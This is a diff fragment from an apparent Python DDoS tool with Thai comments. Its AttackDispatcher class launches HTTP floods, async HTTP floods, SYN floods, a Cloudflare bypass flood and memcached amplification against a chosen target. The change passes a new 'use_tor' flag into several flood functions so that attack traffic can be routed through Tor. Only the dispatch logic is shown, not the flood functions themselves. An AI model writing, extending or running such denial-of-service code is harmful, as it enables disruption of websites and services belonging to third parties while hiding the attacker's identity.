@@ -211,11 +211,11 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
             url = target if target.startswith("http") else f"http://{target}"  # เตรียม URL
             for _ in range(threads):  # วนลูปตามจำนวนเธรด
                 increment_thread_counter()  # เพิ่มตัวนับเธรด
-                threading.Thread(target=http_flood, args=(url, duration, proxies, monitor, max_requests), daemon=True).start()  # เริ่มเธรดโจมตี
+                threading.Thread(target=http_flood, args=(url, duration, proxies, monitor, max_requests, params.get('use_tor', False)), daemon=True).start()  # เริ่มเธรดโจมตี
 
         elif choice == "2":  # ถ้าเลือก Async HTTP Flood
             url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
-            asyncio.run(async_http_flood(url, duration, proxies, monitor, max_requests))  # รัน async function
+            asyncio.run(async_http_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False)))  # รัน async function
 
         elif choice == "3":  # ถ้าเลือก SYN Flood
             for _ in range(threads):  # วนลูปตามจำนวนเธรด
@@ -235,7 +235,7 @@ class AttackDispatcher:  # คลาสสำหรับจัดการก�
 
         elif choice == "8":  # ถ้าเลือก Cloudflare Bypass
             url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
-            cloudflare_bypass_flood(url, duration, proxies, monitor, max_requests)  # เรียกฟังก์ชันโจมตี
+            cloudflare_bypass_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False))  # เรียกฟังก์ชันโจมตี
 
         elif choice == "9":  # ถ้าเลือก Memcached Amplification
             memcached_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี
